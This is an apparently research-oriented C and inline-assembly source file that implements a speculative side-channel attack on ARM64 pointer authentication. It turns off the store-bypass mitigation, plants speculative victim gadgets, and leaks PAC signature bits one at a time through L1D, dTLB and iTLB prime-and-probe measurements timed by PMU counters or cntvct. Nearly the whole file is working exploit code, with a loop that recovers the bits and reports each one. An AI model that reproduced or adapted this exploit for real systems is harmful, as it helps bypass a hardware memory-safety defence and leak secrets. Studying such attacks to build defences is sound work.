#define _GNU_SOURCE
#include <sched.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/random.h>
#include <linux/prctl.h>
#include "channel.h"

// Clear the store-bypass mitigation so the speculation window opens.
void enable_store_bypass(void) {
    prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_STORE_BYPASS, PR_SPEC_ENABLE, 0, 0);
}

uint64_t cntvct(void) {
    uint64_t value = 0;
    asm volatile("isb\n mrs %0, cntvct_el0\n isb" : "=r"(value) :: "memory");
    return value;
}
static inline uint64_t pmu_read(void) {
    uint64_t value = 0;
    asm volatile("mrs %0, pmevcntr0_el0" : "=r"(value));
    return value;
}
static inline uint64_t pmcr_read(void) {
    uint64_t value = 0;
    asm volatile("mrs %0, pmcr_el0" : "=r"(value));
    return value;
}
void fence(void) {
    asm volatile("dsb sy\n isb\n" ::: "memory");
}
void flush_line(const void *line) {
    asm volatile("dc civac, %0" :: "r"(line) : "memory");
}
void pin_to_core(int core) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(core, &set);
    sched_setaffinity(0, sizeof set, &set);
}

// Position-independent victim gadgets: read the slot, form an address from the signature, and access it.
// slot layout: raw #0, and_mask #8, bit_index #16, base #24.
extern void gadget_canon_load(struct slot *);
extern void gadget_canon_load_end(void);
extern void gadget_canon_load_pg(struct slot *);
extern void gadget_canon_load_pg_end(void);
extern void gadget_canon_move48_pg(struct slot *);
extern void gadget_canon_move48_pg_end(void);
extern void gadget_canon_move48_load(struct slot *);
extern void gadget_canon_move48_load_end(void);
extern void gadget_canon_move48_branch(struct slot *);
extern void gadget_canon_move48_branch_end(void);
int g_move48 = 0;   // dtlb+canon: relocate the tested PAC bit to index 48 (set by main)
extern void gadget_canon_branch(struct slot *);
extern void gadget_canon_branch_end(void);
extern void gadget_aut_load(struct slot *);
extern void gadget_aut_load_end(void);
extern void gadget_aut_load_pg(struct slot *);
extern void gadget_aut_load_pg_end(void);
extern void gadget_aut_branch(struct slot *);
extern void gadget_aut_branch_end(void);
asm(
".text\n"
".set SLED_LINES, 16\n"
".set SLED_PAGES, 24\n"
".set DTLB_PAGES, 40\n"
".macro form_canon\n"
"  ldr x16, [x0, #0]\n"
"  ldr x9,  [x0, #8]\n"
"  and x16, x16, x9\n"
".endm\n"
".macro form_aut\n"
"  ldr x2,  [x0, #0]\n"
"  ldr x3,  [x0, #16]\n"
"  ldr x16, [x0, #24]\n"
"  add x3,  x3, #48\n"
"  lsr x2,  x2, x3\n"
"  and x2,  x2, #1\n"
"  bfi x16, x2, #55, #1\n"
"  .arch_extension pauth\n"
"  autiza x16\n"
".endm\n"
// move-to-48: relocate the tested signature bit [48+bit_index] to the single canonicality bit (index 48),
// no autiza -- the kernel-/user-canonicality dual of form_aut's move-to-55, used for the dTLB PAC leak so
// every field bit is read through one bit position.
".macro form_move48\n"
"  ldr x2,  [x0, #0]\n"
"  ldr x3,  [x0, #16]\n"
"  ldr x16, [x0, #24]\n"
"  add x3,  x3, #48\n"
"  lsr x2,  x2, x3\n"
"  and x2,  x2, #1\n"
"  bfi x16, x2, #48, #1\n"
".endm\n"
".macro sled_load\n"
"  .set off, 0\n"
"  .rept SLED_LINES\n"
"    ldr x4, [x16, #off]\n"
"    .set off, off + 64\n"
"  .endr\n"
".endm\n"
// dTLB sled: stride a page per load, so an in-range pointer fills a run of dTLB entries.
".macro sled_load_pg\n"
"  .rept DTLB_PAGES\n"
"    ldr x4, [x16]\n"
"    add x16, x16, #4096\n"
"  .endr\n"
".endm\n"
".globl gadget_canon_load\n gadget_canon_load:\n"
"  form_canon\n sled_load\n  ret\n"
".globl gadget_canon_load_end\n gadget_canon_load_end:\n"
".globl gadget_canon_load_pg\n gadget_canon_load_pg:\n"
"  form_canon\n sled_load_pg\n  ret\n"
".globl gadget_canon_load_pg_end\n gadget_canon_load_pg_end:\n"
".globl gadget_canon_move48_pg\n gadget_canon_move48_pg:\n"
"  form_move48\n sled_load_pg\n  ret\n"
".globl gadget_canon_move48_pg_end\n gadget_canon_move48_pg_end:\n"
".globl gadget_canon_move48_load\n gadget_canon_move48_load:\n"
"  form_move48\n sled_load\n  ret\n"
".globl gadget_canon_move48_load_end\n gadget_canon_move48_load_end:\n"
".globl gadget_canon_move48_branch\n gadget_canon_move48_branch:\n"
"  stp x29, x30, [sp, #-16]!\n  form_move48\n  blr x16\n  ldp x29, x30, [sp], #16\n  ret\n"
".globl gadget_canon_move48_branch_end\n gadget_canon_move48_branch_end:\n"
".globl gadget_canon_branch\n gadget_canon_branch:\n"
"  stp x29, x30, [sp, #-16]!\n  form_canon\n  blr x16\n  ldp x29, x30, [sp], #16\n  ret\n"
".globl gadget_canon_branch_end\n gadget_canon_branch_end:\n"
".globl gadget_aut_load\n gadget_aut_load:\n"
"  form_aut\n  sled_load\n  ret\n"
".globl gadget_aut_load_end\n gadget_aut_load_end:\n"
".globl gadget_aut_load_pg\n gadget_aut_load_pg:\n"
"  form_aut\n  sled_load_pg\n  ret\n"
".globl gadget_aut_load_pg_end\n gadget_aut_load_pg_end:\n"
".globl gadget_aut_branch\n gadget_aut_branch:\n"
"  stp x29, x30, [sp, #-16]!\n  form_aut\n  blr x16\n  ldp x29, x30, [sp], #16\n  ret\n"
".globl gadget_aut_branch_end\n gadget_aut_branch_end:\n");

static void gadget_src(enum pac_switch sw, enum medium med, void **start, void **end) {
    int branch = (M_ITLB == med || M_BTB == med);
    int page = (M_DTLB == med);
    if (SW_CANON == sw) {
        if (g_move48) {                                   // move each PAC bit to index 48, read through one bit
            if (page) {
                *start = (void *)gadget_canon_move48_pg;
                *end = (void *)gadget_canon_move48_pg_end;
            } else if (branch) {
                *start = (void *)gadget_canon_move48_branch;
                *end = (void *)gadget_canon_move48_branch_end;
            } else {
                *start = (void *)gadget_canon_move48_load;
                *end = (void *)gadget_canon_move48_load_end;
            }
        } else if (branch) {
            *start = (void *)gadget_canon_branch;
            *end = (void *)gadget_canon_branch_end;
        } else if (page) {
            *start = (void *)gadget_canon_load_pg;
            *end = (void *)gadget_canon_load_pg_end;
        } else {
            *start = (void *)gadget_canon_load;
            *end = (void *)gadget_canon_load_end;
        }
        return;
    }
    if (branch) {
        *start = (void *)gadget_aut_branch;
        *end = (void *)gadget_aut_branch_end;
    } else if (page) {
        *start = (void *)gadget_aut_load_pg;
        *end = (void *)gadget_aut_load_pg_end;
    } else {
        *start = (void *)gadget_aut_load;
        *end = (void *)gadget_aut_load_end;
    }
}

gadget_fn emit_gadget(void *dst, enum pac_switch sw, enum medium med) {
    void *start = NULL;
    void *end = NULL;
    gadget_src(sw, med, &start, &end);
    size_t len = (size_t)((char *)end - (char *)start);
    memcpy(dst, start, len);
    __builtin___clear_cache((char *)dst, (char *)dst + len);
    return (gadget_fn)dst;
}

static long spec_flag[512]  __attribute__((aligned(4096)));
static long spec_index[512] __attribute__((aligned(4096)));

void victim_transmit(gadget_fn gadget, struct slot *slot, int control) {
    spec_flag[0] = 1;
    spec_index[0] = 0;
    flush_line(&spec_index[0]);
    fence();
    long index = *(volatile long *)&spec_index[0];
    *(volatile long *)&spec_flag[index] = 0;
    if (control) {
        asm volatile("dsb sy\n isb\n" ::: "memory");   // resolve the store before the branch
    }
    if (0 != *(volatile long *)&spec_flag[0]) {
        gadget(slot);
    }
}

static void *map_page(int executable) {
    int prot = PROT_READ | PROT_WRITE | (executable ? PROT_EXEC : 0);
    void *page = mmap(NULL, PAGE_BYTES, prot, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (MAP_FAILED == page) {
        return NULL;
    }
    madvise(page, PAGE_BYTES, MADV_NOHUGEPAGE);
    if (executable) {
        *(uint32_t *)page = 0xD65F03C0u;   // ret
        __builtin___clear_cache((char *)page, (char *)page + 4);
    } else {
        *(uint8_t *)page = 1;
    }
    return page;
}

// iTLB target: a run of executable pages branching into one another, so an in-range pointer fetches a
// span of pages.
static void *alloc_sled(void) {
    uint8_t *region = mmap(NULL, SLED_PAGES * PAGE_BYTES, PROT_READ | PROT_WRITE | PROT_EXEC,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (MAP_FAILED == region) {
        return NULL;
    }
    madvise(region, SLED_PAGES * PAGE_BYTES, MADV_NOHUGEPAGE);
    for (int page = 0; page < SLED_PAGES; ++page) {
        uint32_t *head = (uint32_t *)(region + (size_t)page * PAGE_BYTES);
        *head = (page + 1 < SLED_PAGES) ? 0x14000400u : 0xD65F03C0u;   // b .+4096 | ret
    }
    __builtin___clear_cache((char *)region, (char *)region + SLED_PAGES * PAGE_BYTES);
    return region;
}

void *victim_base_alloc(enum medium med) {
    if (M_ITLB == med) {
        return alloc_sled();
    }
    if (M_DTLB == med) {
        uint8_t *region = mmap(NULL, DTLB_PAGES * PAGE_BYTES, PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (MAP_FAILED == region) {
            return NULL;
        }
        madvise(region, DTLB_PAGES * PAGE_BYTES, MADV_NOHUGEPAGE);
        for (int page = 0; page < DTLB_PAGES; ++page) {
            region[(size_t)page * PAGE_BYTES] = 1;
        }
        return region;
    }
    return map_page(0);
}

void pmu_init(enum medium med) {
    uint64_t event = 0x03;                   // L1D_CACHE_REFILL
    if (M_DTLB == med) {
        event = 0x05;                        // L1D_TLB_REFILL
    } else if (M_ITLB == med) {
        event = 0x02;                        // L1I_TLB_REFILL
    }
    asm volatile("msr pmcntenclr_el0, %0" :: "r"((uint64_t)~0));
    asm volatile("isb");
    asm volatile("msr pmevtyper0_el0, %0" :: "r"(event));
    asm volatile("isb");
    asm volatile("msr pmevcntr0_el0, %0" :: "r"((uint64_t)0));
    asm volatile("isb");
    asm volatile("msr pmcntenset_el0, %0" :: "r"((uint64_t)1));
    asm volatile("isb");
    asm volatile("msr pmcr_el0, %0" :: "r"(pmcr_read() | 7));
    asm volatile("isb");
}

// L1D is 256 sets of 64-byte lines, set index VA[13:6], so lines 16 KB apart are congruent. The victim
// strides SLED_LINES lines from its base. The eviction set holds L1D_WAYS congruent lines per touched set.
#define L1D_STRIDE  (1UL << 14)
#define L1D_WAYS    8
#define NPRIME_DTLB 160
#define NPRIME_ITLB 96

void attacker_setup(struct attacker *att, enum medium med, enum timer tmr, uint64_t victim_base) {
    memset(att, 0, sizeof *att);
    att->med = med;
    att->tmr = tmr;
    if (T_PMU == tmr) {
        pmu_init(med);
    }
    if (M_L1D == med) {
        size_t span = L1D_STRIDE * (L1D_WAYS + 2);
        uint8_t *raw = mmap(NULL, span + L1D_STRIDE, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (MAP_FAILED == raw) {
            perror("mmap L1D eviction set");
            exit(1);
        }
        uint8_t *buffer = (uint8_t *)(((uintptr_t)raw + L1D_STRIDE - 1) & ~(L1D_STRIDE - 1));
        int n = 0;
        for (int line = 0; line < SLED_LINES; ++line) {
            uint64_t set_off = ((victim_base >> 6) + (uint64_t)line) & 0xffUL;
            for (int way = 0; way < L1D_WAYS; ++way) {
                uint8_t *addr = buffer + set_off * LINE_BYTES + (size_t)way * L1D_STRIDE;
                att->prime[n] = addr;
                *(volatile uint8_t *)addr = 1;
                n++;
            }
        }
        att->nprime = n;
        return;
    }
    int n = (M_DTLB == med) ? NPRIME_DTLB : NPRIME_ITLB;
    for (int page = 0; page < n; ++page) {
        att->prime[page] = map_page(M_ITLB == med);
        if (NULL == att->prime[page]) {
            perror("mmap TLB eviction page");
            exit(1);
        }
    }
    att->nprime = n;
}

static inline void touch_elem(const struct attacker *att, int index) {
    if (M_ITLB == att->med) {
        ((void (*)(void))att->prime[index])();
    } else {
        (void)*(volatile uint8_t *)att->prime[index];
    }
}

static void attacker_prime(const struct attacker *att) {
    for (int index = 0; index < att->nprime; ++index) {
        touch_elem(att, index);
    }
    fence();
}

// Probe in reverse: a refill evicts the LRU, an element already measured, so eviction never cascades.
// PMU counts refill events. cntvct sums per-element reload latency. Either tracks how many the victim evicted.
static double attacker_measure(const struct attacker *att) {
    double acc = 0;
    for (int index = att->nprime - 1; 0 <= index; --index) {
        if (T_CNTVCT == att->tmr) {
            uint64_t before = cntvct();
            touch_elem(att, index);
            acc += (double)(cntvct() - before);
        } else {
            asm volatile("isb");
            uint64_t before = pmu_read();
            touch_elem(att, index);
            asm volatile("isb");
            acc += ((uint32_t)(pmu_read() - before)) > 0;
        }
    }
    fence();
    return acc;
}

double channel_shot(struct attacker *att, transmit_fn tx, void *ctx) {
    attacker_prime(att);
    tx(ctx);
    fence();
    return attacker_measure(att);
}

uint64_t pac_sign(uint64_t ptr, uint64_t mod) {
    asm volatile("pacia %0, %1" : "+r"(ptr) : "r"(mod));
    return ptr;
}

uint64_t rand_u64(void) {
    uint64_t value = 0;
    if (sizeof value != getrandom(&value, sizeof value, 0)) {
        perror("getrandom");
        exit(1);
    }
    return value;
}

void slot_secret(struct slot *slot, enum pac_switch sw, uint64_t signature, uint64_t base, int bit) {
    slot->raw = signature;
    slot->base = base;
    if (SW_CANON == sw && !g_move48) {
        slot->and_mask = ~SECRET_FIELD | (1UL << (48 + bit));
    } else {                                  // aut, or canon move-to-48: extract bit [48+bit], relocate
        slot->bit_index = (uint64_t)bit;
    }
}

void slot_profile(struct slot *slot, enum pac_switch sw, uint64_t base, int bit, int value) {
    slot->base = base;
    if (SW_CANON == sw && !g_move48) {
        slot->and_mask = ~SECRET_FIELD | (1UL << (48 + bit));
        slot->raw = (base & ~SECRET_FIELD) | ((uint64_t)value << (48 + bit));
    } else {                                  // aut, or canon move-to-48
        slot->bit_index = (uint64_t)bit;
        slot->raw = (uint64_t)value << (48 + bit);
    }
}

// Recover each bit from a SINGLE masked measurement (no per-sample hypothesis). The two references
// (bit forced 0 and bit forced 1) are the profiles slot_profile builds from `base` with a known value in
// the isolated bit -- signature-independent -- so they are measured ONCE per bit position up front, giving
// a per-position centroid pair. Each round then transmits only the secret (set_mode(-1)) and classifies it
// against that one-time pair. The per-bit references are built once; the leak itself is one shot per bit.
void recover_rounds(struct attacker *att, struct victim_io *io, const struct cfg *cfg, struct chan_stats *out) {
    int nbits = SECRET_BITS;
    struct chan_stats stats = { .rounds = cfg->rounds, .bits_total = (long)cfg->rounds * nbits, .nbits = nbits };

    // One-time per-position calibration of the two references (forced 0 / forced 1). Afford extra samples
    // here since it runs once, not per round.
    double p0_ref[SECRET_BITS] = { 0 };
    double p1_ref[SECRET_BITS] = { 0 };
    int cal_samples = cfg->samples * 8;
    if (cal_samples < 64) { cal_samples = 64; }
    io->next_round(io->ctx);
    for (int bit = 0; bit < nbits; ++bit) {
        io->set_bit(io->ctx, bit);
        double s0 = 0, s1 = 0;
        for (int sample = 0; sample < cal_samples; ++sample) {
            io->set_mode(io->ctx, 0);
            s0 += channel_shot(att, io->transmit, io->ctx);
            io->set_mode(io->ctx, 1);
            s1 += channel_shot(att, io->transmit, io->ctx);
        }
        p0_ref[bit] = s0 / cal_samples;
        p1_ref[bit] = s1 / cal_samples;
    }

    struct timespec t0 = { 0 };
    struct timespec t1 = { 0 };
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (int round = 0; round < cfg->rounds; ++round) {
        io->next_round(io->ctx);
        unsigned recovered = 0;
        for (int bit = 0; bit < nbits; ++bit) {
            io->set_bit(io->ctx, bit);
            double secret_sum = 0;
            for (int sample = 0; sample < cfg->samples; ++sample) {
                io->set_mode(io->ctx, -1);
                secret_sum += channel_shot(att, io->transmit, io->ctx);
            }
            double secret_avg = secret_sum / cfg->samples;
            recovered |= (unsigned)classify(secret_avg, p0_ref[bit], p1_ref[bit]) << bit;
        }
        unsigned field_mask = (nbits >= 32) ? 0xffffffffu : ((1u << nbits) - 1u);
        unsigned truth = io->reveal(io->ctx) & field_mask;
        int ok = bits_match(recovered, truth, nbits);
        stats.bits_correct += ok;
        stats.full += (recovered == truth);
        for (int bit = 0; bit < nbits; ++bit) {
            stats.pos_total[bit]++;
            stats.pos_correct[bit] += (((recovered >> bit) & 1u) == ((truth >> bit) & 1u));
        }
        tee_printf("  %3d  | secret=0x%02x  recovered=0x%02x  %d/%d  %s\n",
            round, truth, recovered, ok, nbits, (recovered == truth) ? "WIN" : "lose");
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    stats.seconds = (t1.tv_sec - t0.tv_sec) + (t1.tv_nsec - t0.tv_nsec) / 1e9;
    *out = stats;
}

int classify(double signal, double centroid0, double centroid1) {
    double to0 = signal - centroid0;
    double to1 = signal - centroid1;
    if (to0 < 0) {
        to0 = -to0;
    }
    if (to1 < 0) {
        to1 = -to1;
    }
    return (to1 < to0) ? 1 : 0;
}
